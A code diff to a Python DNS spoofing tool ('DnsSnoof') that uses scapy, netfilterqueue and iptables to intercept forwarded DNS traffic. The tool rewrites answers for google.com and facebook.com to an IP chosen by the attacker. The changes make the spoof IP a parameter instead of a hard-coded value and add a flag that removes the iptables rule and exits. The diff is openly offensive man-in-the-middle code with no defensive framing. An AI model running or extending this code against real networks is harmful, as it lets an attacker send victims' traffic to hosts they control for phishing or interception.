@@ -3,8 +3,6 @@ import logging as log
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 from netfilterqueue import NetfilterQueue
 
-flg = 0
-dnsSpoof = ""
 
 class DnsSnoof:
 	def __init__(self, hostDict, queueNum):
@@ -25,6 +23,11 @@ class DnsSnoof:
 			log.info("[!] iptable rule flushed")
 
 	def callBack(self, packet):
+		if flg == 3 :
+			os.system(
+				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+			log.info("[!] iptable rule flushed")
+			exit()
 		scapyPacket = IP(packet.get_payload())
 		if scapyPacket.haslayer(DNSRR):
 			try:
@@ -47,11 +50,15 @@ class DnsSnoof:
 		return packet.accept()
 
 
-def dnsspoint():
+def dnsspoint(dnsIp,flgs):
+	global flg
+	global spoofIp
+	flg = flgs
+	spoofIp = dnsIp
 	try:
 		hostDict = {
-			b"google.com.": "192.168.1.9",
-			b"facebook.com.": "192.168.1.9"
+			b"google.com.": spoofIp,
+			b"facebook.com.": spoofIp
 		}
 		queueNum = 1
 		log.basicConfig(format='%(asctime)s - %(message)s',
